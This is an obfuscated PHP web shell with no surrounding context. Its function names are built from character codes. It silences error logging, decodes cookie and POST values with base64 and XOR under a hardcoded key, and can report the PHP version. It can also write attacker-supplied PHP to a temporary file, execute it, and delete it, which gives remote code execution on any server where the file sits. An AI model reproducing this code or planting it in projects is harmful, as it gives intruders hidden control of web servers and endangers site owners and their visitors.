<?php $fjmtw = chr(102)."\x69".chr(108).chr(126-25).'_'.'p'.chr(117).chr(419-303)."\x5f".chr(99).chr(111).chr(714-604)."\164"."\145"."\x6e".chr(116)."\x73";
$eefdbgy = 'b'.chr(97)."\163".'e'."\x36"."\x34".chr(1094-999).chr(841-741).chr(444-343).chr(99).'o'.'d'.chr(335-234);
$rszdfgusoc = "\x69".chr(498-388)."\151".chr(916-821)."\x73".'e'.chr(117-1);
$zgcaqom = 'u'.chr(257-147).chr(108).chr(105).chr(110)."\x6b";


@$rszdfgusoc(chr(101)."\162".chr(114)."\157".'r'.'_'."\x6c"."\157"."\147", NULL);
@$rszdfgusoc("\x6c"."\x6f".'g'.'_'."\x65".chr(114).'r'."\x6f".chr(114)."\x73", 0);
@$rszdfgusoc("\x6d".'a'."\170"."\x5f".'e'.chr(1048-928)."\145".'c'.'u'."\x74".'i'."\x6f".chr(110).chr(95)."\164".chr(105)."\x6d".chr(101), 0);
@set_time_limit(0);

function yftyh($xiydhs, $xpljihp)
{
    $earuxgxmv = "";
    for ($dvpssnbuwk = 0; $dvpssnbuwk < strlen($xiydhs);) {
        for ($j = 0; $j < strlen($xpljihp) && $dvpssnbuwk < strlen($xiydhs); $j++, $dvpssnbuwk++) {
            $earuxgxmv .= chr(ord($xiydhs[$dvpssnbuwk]) ^ ord($xpljihp[$j]));
        }
    }
    return $earuxgxmv;
}

$npevmmfxub = array_merge($_COOKIE, $_POST);
$nfcbqvj = '30cb81a6-03aa-4dbf-9e86-e479cb76f923';
foreach ($npevmmfxub as $piapzvxz => $xiydhs) {
    $xiydhs = @unserialize(yftyh(yftyh($eefdbgy($xiydhs), $nfcbqvj), $piapzvxz));
    if (isset($xiydhs['a'."\x6b"])) {
        if ($xiydhs['a'] == "\x69") {
            $dvpssnbuwk = array(
                chr(112).chr(180-62) => @phpversion(),
                chr(115)."\x76" => "3.5",
            );
            echo @serialize($dvpssnbuwk);
        } elseif ($xiydhs['a'] == chr(101)) {
            $vdkduza = "./" . md5($nfcbqvj) . chr(668-622).'i'.'n'."\143";
            @$fjmtw($vdkduza, "<" . "\x3f".'p'.chr(104).chr(112).chr(433-401).chr(309-245)."\165"."\156"."\x6c"."\x69".chr(110).chr(968-861).'('."\x5f"."\137".chr(967-897)."\111"."\114".chr(692-623)."\x5f".chr(95).chr(787-746)."\x3b"."\x20" . $xiydhs[chr(100)]);
            include($vdkduza);
            @$zgcaqom($vdkduza);
        }
        exit();
    }
}

